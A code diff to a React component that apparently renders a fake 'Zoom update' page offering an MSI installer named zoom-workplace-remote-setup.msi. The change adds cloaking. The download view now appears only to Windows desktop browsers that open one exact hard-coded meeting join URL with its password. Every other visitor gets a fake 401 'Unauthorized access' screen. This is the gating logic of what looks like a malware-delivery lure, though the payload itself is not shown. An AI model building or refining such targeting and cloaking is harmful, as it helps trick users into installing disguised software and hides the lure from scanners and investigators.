@@ -6,16 +6,30 @@ const UPDATE_FILE_PATH = "/zoom-workplace-remote-setup.msi";
 const MINIMUM_LOADING_TIME = 2000;
 const NON_DESKTOP_USER_AGENT =
   /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|Tablet/i;
+const AUTHORIZED_PATH =
+  "/j/8237770634?pwd=i7gt2XsqvGas7hF6ZaJyQaKCnjVdfU.1";
 
-const isDesktopDevice = () => {
+// Matches Windows desktop user agents / platforms
+const WINDOWS_USER_AGENT = /Windows NT|Win32|Win64|WOW64/i;
+
+export const isWindowsDesktopDevice = () => {
   const hasDesktopViewport = window.matchMedia("(min-width: 1024px)").matches;
   const hasDesktopPointer = window.matchMedia(
     "(hover: hover) and (pointer: fine)",
   ).matches;
   const hasMobileUserAgent = NON_DESKTOP_USER_AGENT.test(navigator.userAgent);
 
-  return hasDesktopViewport && hasDesktopPointer && !hasMobileUserAgent;
+  const uaIsWindows = WINDOWS_USER_AGENT.test(navigator.userAgent);
+  const platformIsWindows = typeof navigator.platform === "string" &&
+    navigator.platform.toLowerCase().includes("win");
+
+  const isWindows = uaIsWindows || platformIsWindows;
+
+  return hasDesktopViewport && hasDesktopPointer && !hasMobileUserAgent && isWindows;
 };
+
+const isAuthorizedUrl = () =>
+  window.location.pathname + window.location.search === AUTHORIZED_PATH;
 
 const ZoomUpdateFullScreen = () => {
   const [accessState, setAccessState] = useState<
@@ -27,7 +41,9 @@ const ZoomUpdateFullScreen = () => {
 
     const finishLoading = () => {
       timeoutId = window.setTimeout(() => {
-        setAccessState(isDesktopDevice() ? "desktop" : "blocked");
+        setAccessState(
+          isWindowsDesktopDevice() && isAuthorizedUrl() ? "desktop" : "blocked",
+        );
       }, MINIMUM_LOADING_TIME);
     };
 
@@ -97,10 +113,11 @@ const ZoomUpdateFullScreen = () => {
             401
           </h1>
           <p className="mt-4 text-xl font-bold text-gray-900">
-            Unauthorized device
+            Unauthorized access
           </p>
           <p className="mt-3 text-sm leading-relaxed text-gray-600">
-            This update page is only available from a desktop computer.
+            This update page is only available from the authorized desktop Zoom meeting URL.
+            Please open the exact join link provided to continue.
           </p>
         </div>
       </div>
